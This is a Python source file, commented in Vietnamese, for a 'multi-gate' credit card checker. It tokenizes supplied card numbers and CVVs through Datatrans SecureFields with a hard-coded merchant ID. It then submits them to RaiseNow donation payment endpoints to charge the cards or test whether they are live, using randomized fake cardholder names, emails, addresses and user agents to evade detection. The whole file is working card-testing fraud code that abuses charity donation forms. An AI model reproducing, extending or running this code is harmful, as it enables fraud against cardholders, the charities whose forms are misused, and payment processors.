import time
import requests
import json
import random
import string
import logging
import copy

# Import kho cấu hình
from gate_configurations import GATE_CONFIGS

logger = logging.getLogger(__name__)

# --- CÁC HÀM TIỆN ÍCH ---

def generate_random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email(config):
    """Tạo email ngẫu nhiên dựa trên cấu hình của gate."""
    min_len, max_len = config['text_length_range']
    num_digits = config['append_digits']
    
    text_part = ''.join(random.choices(string.ascii_lowercase, k=random.randint(min_len, max_len)))
    number_part = ''
    if num_digits > 0:
        number_part = ''.join(random.choices(string.digits, k=num_digits))
        
    prefix = f"{text_part}{number_part}"
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_user_agent():
    chrome_major = random.randint(100, 138)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = "10.0; Win64; x64"
    return (f"Mozilla/5.0 (Windows NT {win_version}) "
            f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
            f"Chrome/{chrome_version} Safari/{safari_version}")

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            if cancellation_event:
                if cancellation_event.wait(wait_time):
                    return None, "Operation cancelled by user"
            else:
                time.sleep(wait_time)
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

# --- LOGIC CHECKER CHUNG ---

def _check_card_generic(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, mode, charge_value, gate_name, gate_config):
    """Hàm nội bộ để check thẻ với một cấu hình gate cụ thể."""
    try:
        # --- Tạo dữ liệu ngẫu nhiên dựa trên cấu hình gate ---
        user_agent = random_user_agent()
        min_name, max_name = gate_config['name_length_range']
        first_name = generate_random_string(random.randint(min_name, max_name))
        last_name = generate_random_string(random.randint(min_name, max_name))
        cardholder = f"{first_name} {last_name}"
        email = random_email(gate_config['email_config'])
        
        # Tạo dữ liệu địa chỉ ngẫu nhiên
        street = generate_random_string(random.randint(20, 35))
        house_number = generate_random_string(random.randint(20, 35))
        postal_code = ''.join(random.choices(string.digits, k=5))
        city = generate_random_string(random.randint(20, 35))
        
        # === PHẦN MỚI: TẠO MESSAGE NGẪU NHIÊN ===
        random_message = generate_random_string(random.randint(20, 35))
        # =======================================

        # --- Bước 1: Lấy Token cho thẻ ---
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "pay.datatrans.com", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "User-Agent": user_agent, "X-Requested-With": "XMLHttpRequest" }
        tokenize_payload = { "mode": "TOKENIZE", "formId": gate_config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, f"[{gate_name}] HTTP Error with no response during Tokenization", bin_info

        if "Card number not allowed in production" in token_response.text: return 'decline', line, f'[{gate_name}] INVALID_CARDNUMBER_DECLINE', bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}): return 'decline', line, f'[{gate_name}] {token_data["error"]["message"]}', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id: return 'decline', line, f'[{gate_name}] {token_data.get("error", "Unknown error at Tokenize")}', bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200: return 'error', line, f"[{gate_name}] HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, f"[{gate_name}] Tokenize response was not JSON", bin_info

        # --- Bước 2: Thực hiện request dựa trên chế độ ---
        payment_headers = { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent }
        
        # Tạo payload từ template, thay thế các placeholder
        payload_str = json.dumps(gate_config['payload'])
        payload_str = payload_str.replace("{{first_name}}", first_name)
        payload_str = payload_str.replace("{{last_name}}", last_name)
        payload_str = payload_str.replace("{{cardholder}}", cardholder)
        payload_str = payload_str.replace("{{email}}", email)
        payload_str = payload_str.replace("{{user_agent}}", user_agent)
        payload_str = payload_str.replace("{{expiry_month}}", mes.zfill(2))
        payload_str = payload_str.replace("{{expiry_year}}", ano)
        payload_str = payload_str.replace("{{transaction_id}}", transaction_id)
        
        # Thay thế placeholder địa chỉ
        payload_str = payload_str.replace("{{street}}", street)
        payload_str = payload_str.replace("{{house_number}}", house_number)
        payload_str = payload_str.replace("{{postal_code}}", postal_code)
        payload_str = payload_str.replace("{{city}}", city)

        # === PHẦN MỚI: THAY THẾ PLACEHOLDER MESSAGE ===
        payload_str = payload_str.replace("{{message}}", random_message)
        # ============================================
        
        base_payload = json.loads(payload_str)

        # --- Logic cho Charge hoặc Live ---
        if mode == 'charge':
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload
            payment_payload["amount"] = {"currency": gate_config['currency'], "value": charge_value}
            
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, f"[{gate_name}] HTTP Error with no response during Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'[{gate_name}] GATE_DIED: Forbidden', bin_info
            
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'[{gate_name}] CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, f'[{gate_name}] {response_text}', bin_info
            elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text: return 'custom', line, f'[{gate_name}] {response_text}', bin_info
            else: return 'unknown', line, f'[{gate_name}] {response_text}', bin_info
        
        else: # 'live' mode
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload
            payment_payload["amount"] = {"currency": gate_config['currency'], "value": 50} 

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, f"[{gate_name}] HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'[{gate_name}] GATE_DIED: Forbidden', bin_info
            
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, f'[{gate_name}] {response_text}', bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, f'[{gate_name}] {response_text}', bin_info
            else: return 'unknown', line, f'[{gate_name}] {response_text}', bin_info

    except Exception as e:
        logger.error(f"Unknown error in Generic Checker for gate '{gate_name}' on line '{line}': {e}", exc_info=True)
        return 'error', line, f"[{gate_name}] System Error: {e}", bin_info

def check_card_multi_gate(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_mode_func, get_charge_value_func, custom_charge_amount=None):
    """
    Hàm chính cho chế độ Multi-Gate.
    Nó sẽ chọn ngẫu nhiên một gate từ kho cấu hình và chạy.
    """
    try:
        # Lấy danh sách các key của gate
        available_gates = list(GATE_CONFIGS.keys())
        if not available_gates:
            return 'error', line, "No gates defined in gate_configurations.py", bin_info
            
        # Chọn ngẫu nhiên một gate
        random_gate_name = random.choice(available_gates)
        gate_config = GATE_CONFIGS[random_gate_name]
        
        # Lấy chế độ (live/charge) và giá trị charge
        mode = get_mode_func() 
        charge_value = get_charge_value_func(random_gate_name, custom_charge_amount)
        
        logger.info(f"Running card on Multi-Gate mode, randomly selected: {random_gate_name}")
        
        # Gọi hàm checker chung với cấu hình đã chọn
        return _check_card_generic(
            session, line, cc, mes, ano, cvv, bin_info, cancellation_event, 
            mode, charge_value, random_gate_name, gate_config
        )
    except Exception as e:
        logger.error(f"Error in Multi-Gate selection process for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Multi-Gate Main Error: {e}", bin_info
